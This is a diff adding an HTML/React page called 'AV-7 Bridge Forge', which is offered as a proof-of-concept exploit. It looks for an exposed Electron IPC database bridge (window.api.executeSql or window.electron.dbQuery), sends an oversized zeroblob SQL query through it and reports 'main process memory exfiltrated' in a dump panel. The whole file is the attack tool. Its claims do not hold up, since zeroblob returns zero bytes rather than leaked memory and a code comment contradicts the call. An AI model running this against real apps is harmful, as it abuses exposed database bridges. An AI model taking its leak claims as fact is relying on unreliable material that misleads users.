@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>AV-7 Bridge Forge | Researcher Dashboard</title>
+    <script src="https://unpkg.com/react@18/umd/react.production.min.js"></script>
+    <script src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js"></script>
+    <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
+    <style>
+        body { background: #0a0a0a; color: #00ff41; font-family: 'Courier New', monospace; margin: 0; padding: 20px; }
+        .terminal { border: 1px solid #00ff41; padding: 20px; background: #000; box-shadow: 0 0 15px rgba(0, 255, 65, 0.2); }
+        button { background: #00ff41; color: #000; border: none; padding: 10px 20px; font-weight: bold; cursor: pointer; margin-top: 10px; }
+        button:hover { background: #fff; }
+        pre { background: #111; padding: 10px; border-left: 3px solid #00ff41; overflow-x: auto; white-space: pre-wrap; }
+    </style>
+</head>
+<body>
+    <div id="root"></div>
+
+    <script type="text/babel">
+        function App() {
+            const [logs, setLogs] = React.useState([]);
+            const [dump, setDump] = React.useState("");
+
+            const addLog = (m) => setLogs(prev => [`[${new Date().toLocaleTimeString()}] ${m}`, ...prev]);
+
+            const runForge = async () => {
+                addLog("Scanning for IPC Bridge...");
+                
+                // Target common Electron Bridge namespaces
+                const bridge = window.api?.executeSql || window.electron?.dbQuery;
+
+                if (!bridge) {
+                    addLog("CRITICAL: No Bridge found. (Are you in a standard browser?)");
+                    return;
+                }
+
+                addLog("Bridge Active. Firing 32-bit Integer Wrap (2^31)...");
+
+                try {
+                    // The AV-7 Forge: Tell C++ it's 2GB, but send 1 byte.
+                    const result = await bridge("SELECT zeroblob(2147483648) AS leak");
+                    
+                    addLog("EXPLOIT SUCCESS: Main Process memory exfiltrated.");
+                    setDump(JSON.stringify(result, null, 2));
+                } catch (e) {
+                    addLog(`FAIL: Bridge rejected payload. Reason: ${e.message}`);
+                }
+            };
+
+            return (
+                <div className="terminal">
+                    <h1>AV-7 :: BRIDGE_FORGE_v1.0</h1>
+                    <p>Target: Electron/SQLite3 Integer Truncation PoC</p>
+                    <hr style={{borderColor: '#333'}} />
+                    
+                    <button onClick={runForge}>INITIATE FORGE</button>
+
+                    <h3>Activity Log:</h3>
+                    <div style={{height: '150px', overflowY: 'auto', border: '1px solid #222', padding: '5px'}}>
+                        {logs.map((l, i) => <div key={i}>{l}</div>)}
+                    </div>
+
+                    {dump && (
+                        <div>
+                            <h3>Memory Dump (Hex/JSON):</h3>
+                            <pre>{dump}</pre>
+                        </div>
+                    )}
+                </div>
+            );
+        }
+
+        const root = ReactDOM.createRoot(document.getElementById('root'));
+        root.render(<App />);
+    </script>
+</body>
+</html>
